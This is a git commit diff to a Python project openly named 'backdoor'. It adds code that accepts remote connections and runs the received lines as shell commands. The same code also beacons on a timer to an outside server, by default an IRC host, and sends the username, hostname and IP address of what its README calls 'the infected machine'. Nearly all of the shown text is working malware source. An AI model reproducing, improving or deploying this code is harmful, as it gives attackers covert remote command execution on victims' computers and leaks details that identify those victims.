e30da979963079176c85e738c0b23d4c9f4e8e60
Alexandre Tea <alexandre.qtea@gmail.com>
2016-08-09 22:01:51 +0400

    add license + doc + ping remote server

--- README.md
+++ README.md
@@ -1,2 +1,5 @@
 # backdoor
-a cross-platform backdoor written with Python
+A single-script backdoor who allows remote connections to execute
+shell commands. The backdoor will ping a remote server every TIMEOUT seconds,
+sending him the username, the host, and -most importantly- the IP address of
+the infected machine.
--- backdoor.py
+++ backdoor.py
@@ -1,23 +1,37 @@
 #!/usr/bin/env python
 
-# developed for python 2.7
+# Author:   Alexandre Tea <alexandre.qtea@gmail.com>
+# File:     /Users/alexandretea/Work/backdoor/backdoor.py
+# Purpose:  Single-script backdoor implementation
+# Created:  2016-08-09 21:32:41
+# Modified: 2016-08-09 21:34:37
 
 import sys
 import socket
 import argparse
 import subprocess
 import logging
+import getpass
 from threading import Thread
 
-# TODO ping someone/somewhere and give ip info (irc ?)
+# TODO ping remote type (irc)
 # TODO write proper readme
 # TODO write disclaimer, "this is an exercice, not responsible for blabla"
 # TODO encrypt communications
-# TODO should be cross-platform
+# TODO is cross-platform ?
 # TODO deploy script
+# TODO cli help description with __doc__
+# TODO doc
+
+__doc__ = """ A single-script backdoor who allows remote connections to execute
+shell commands. The backdoor will ping a remote server every TIMEOUT seconds,
+sending him the username, the host, and -most importantly- the IP address of
+the infected machine.
+"""
 
 
 class Client:
+
     def __init__(self, host, port):
         self.host = host
         self.port = port
@@ -28,6 +42,12 @@ class Client:
 
     def disconnect(self):
         self.socket.close()
+
+    def send(self, msg):
+        self.socket.send(msg)
+
+    def get_ip_address(self):
+        return self.socket.getsockname()[0]
 
 
 class Server(object):
@@ -77,9 +97,13 @@ class Server(object):
 
 
 class Backdoor(Server):
-    def __init__(self, ping=True, **kwargs):
+    def __init__(self, ping=True, ping_host=None, ping_port=None, **kwargs):
         super(Backdoor, self).__init__(**kwargs)
         self.should_ping = ping
+        self.ping_host = ping_host
+        self.ping_port = ping_port
+        if self.should_ping:
+            self.init_ping_connection()
 
     def handle_client(self, socket, address):
         super(Backdoor, self).handle_client(socket, address)
@@ -95,21 +119,53 @@ class Backdoor(Server):
                 line = line[:-1]
 
             try:
-                out = subprocess.check_output(line)
+                out = subprocess.check_output(line.split(" "))
                 socket.send(out)
             except Exception as e:
                 socket.send(str(e))
 
         socket.close()
-        logging.info("Connection with " + address[0] + ":" +
-                     str(address[1]) + " closed")
+        logging.info("Connection with {}:{} closed"
+                     .format(address[0], address[1]))
 
     def handle_timeout(self):
-        print("zobb")
+        if self.should_ping:
+            if self.ping_client is None:
+                self.init_ping_connection()
+            if self.ping_client is not None:
+                try:
+                    self.ping_client.send("{}@{}({})"
+                                          .format(self.username, self.hostname,
+                                                  self.ping_client
+                                                  .get_ip_address()))
+                except Exception as e:
+                    self.ping_client.disconnect()
+                    self.ping_client = None
+                    logging.error("Can't ping remote server ({}:{}): {}"
+                                  .format(self.ping_host, self.ping_host,
+                                          str(e)))
+
+    def init_ping_connection(self):
+        self.ping_client = None
+        if self.ping_host is None or self.ping_port is None:
+            logging.warning("Can't ping remote server, host/port is not set")
+        else:
+            try:
+                self.ping_client = Client(self.ping_host, self.ping_port)
+                self.ping_client.connect()
+                logging.info("Connected to remote ping server ({}:{})"
+                            .format(self.ping_host, self.ping_port))
+                self.username = getpass.getuser()
+                self.hostname = socket.gethostname()
+            except Exception as e:
+                logging.warning("Can't connect to ping server ({}:{}): {}"
+                                .format(self.ping_host, self.ping_port,
+                                        str(e)))
+                self.ping_client = None
 
 
 def main():
-    parser = argparse.ArgumentParser(description="zobb")
+    parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("-p", "--port", type=int, action="store", default=4242,
                         help="listening port")
     parser.add_argument("--backlog", type=int, action="store", default=5,
@@ -120,6 +176,12 @@ def main():
                         default="info", help="log level")
     parser.add_argument("--no-ping", action="store_false", dest="ping",
                         default=True, help="disable ping")
+    parser.add_argument("--ping-host", type=str, action="store",
+                        default="irc.freenode.net",
+                        help="hostname of the server to ping")
+    parser.add_argument("--ping-port", type=int, action="store",
+                        default=6667,
+                        help="port of the server to ping")
     args = parser.parse_args(sys.argv[1:])
 
     backdoor = Backdoor(**vars(args))
